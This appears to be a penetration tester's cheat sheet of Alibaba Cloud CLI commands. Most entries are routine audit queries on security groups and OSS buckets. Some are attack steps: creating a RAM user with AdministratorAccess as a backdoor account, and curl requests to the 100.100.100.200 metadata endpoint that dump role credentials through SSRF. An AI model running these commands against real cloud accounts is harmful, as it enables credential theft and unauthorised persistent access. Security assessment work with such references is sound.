# ALIYUN

% aliyun

#plateform/linux #target/local #cat/UTILS  #cat/RECON 

## ALIYUN ECS Describe Security Group Attribute
aliyun ecs DescribeSecurityGroupAttribute --SecurityGroupId <security_group_id> | jq '.Permissions.Permission[] | select(.Policy=="Accept") | .PortRange'

## ALIYUN Configure
aliyun configure

## ALIYUN Configure STS
aliyun configure --mode StsToken

## ALIYUN OSS Bucket Policy 
aliyun oss bucket-policy oss://<bucket_name> --method get

## ALIYUN OSS Logging 
aliyun oss logging --method get oss://<bucket_name>

## ALIYUN OSS Bucket Encryption
aliyun oss bucket-encryption oss://<bucket_name> --method get

## ALIYUN ECS Describe Disks
aliyun ecs DescribeDisks --RegionId <region_id> --DiskName <disk_name>

## ALIYUN RAM Creat User
aliyun ram CreateUser --UserName <custom_user_name>

## ALIYUN RAM Create Login Profile
aliyun ram CreateLoginProfile --UserName <user_name> --Password <custom_user_pass>

## ALIYUN RAM Attach Administrator Policy to User
aliyun ram AttachPolicyToUser --PolicyType System --PolicyName AdministratorAccess --UserName <user_name>

## ALIYUN RAM Get Account Alias
aliyun ram GetAccountAlias

## ALIYUN SSRF in ECS - List roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/

## ALIYUN SSRF in ECS - Dump roles
#plateform/linux #target/remote #protocol/http #port/80 #cat/RECON
curl http://100.100.100.200/latest/meta-data/ram/security-credentials/<role_name>

## ALIYUN Get Token to Metadata
TOKEN=`curl -X PUT "http://100.100.100.200/latest/api/token" -H "X-aliyun-ecs-metadata-token-ttl-seconds: 21600"` && curl -H "X-aliyun-ecs-metadata-token: $TOKEN"  http://100.100.100.200/latest/meta-data/